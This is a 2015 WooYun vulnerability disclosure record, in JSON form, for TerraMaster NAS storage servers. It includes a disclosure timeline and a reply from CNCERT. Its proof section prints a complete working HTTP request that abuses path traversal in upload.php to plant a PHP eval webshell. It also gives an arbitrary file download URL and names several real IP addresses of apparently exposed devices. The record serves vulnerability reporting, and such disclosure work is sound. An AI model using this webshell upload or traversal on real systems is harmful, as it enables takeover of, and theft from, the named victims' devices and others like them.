{"id": 44038, "wybug_id": "wooyun-2015-095059", "wybug_title": "TerraMaster NAS网络存储服务器无限制getshell等漏洞（附poc）", "wybug_corp": "TerraMaster", "wybug_author": "YY-2012", "wybug_date": "2015-02-01 18:30", "wybug_open_date": "2015-05-05 10:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "逻辑错误", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向公众公开  简要描述： 无限制getshell，添加任意管理员，任意文件下载，多处信息泄露。。 详细说明：  百度，谷歌等可搜索：\"TerraMaster 系统管理\"几个漏洞貌似通杀TerraMaster NAS网络存储服务器所有产品型号。部分案例：\nhttp://150.255.30.111:8080/http://222.35.41.77:8181/http://58.18.131.8/http://mxfor.com/http://218.8.130.130:8080/http://112.65.19.2:8080/\n   漏洞证明：  \nPOST /include/upload.php?targetDir=../cgi-bin/filemanage/ HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3User-Agent: Shockwave FlashHost: 地址Content-Length: 722Proxy-Connection: Keep-AlivePragma: no-cacheCookie: PHPSESSID=------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3Content-Disposition: form-data; name=\"Filename\"1.php------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3Content-Disposition: form-data; name=\"name\"1.php------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3Content-Disposition: form-data; name=\"chunk\"0------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3Content-Disposition: form-data; name=\"chunks\"1------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3Content-Disposition: form-data; name=\"file\"; filename=\"1.php\"Content-Type: application/octet-stream<?php @eval($_POST['kao']);?>------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3Content-Disposition: form-data; name=\"Upload\"Submit Query------------ei4KM7ae0KM7GI3ei4cH2ei4KM7GI3--\n\n\n\n\n添加用户名为aaaaaa密码aaaaaa的账号\n\n\n\n任意文件下载（注意下载回来的php源码都是加密的）\nhttp://地址/cgi-bin/filemanage/download.php?file=../../include/upload.php\n\n\n多处信息泄露，不一一举例，看图\n\n\n\n   修复方案：  你们懂的！我不知道。。   版权声明：转载请注明来源 YY-2012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-04 10:52 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-03 11:31 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  您好：感谢您对CNVD的支持，请协助CNVD提供下添加任意管理员的细节，如：构造的html代码等，并邮件vreport@cert.org.cn邮箱。祝好！    \n     2015-02-03 11:47 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  @cncert国家互联网应急中心 “测试代码”不是已经给出了添加任意管理员的poc吗？你看不到？修改地址保存htm，访问提交就是了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}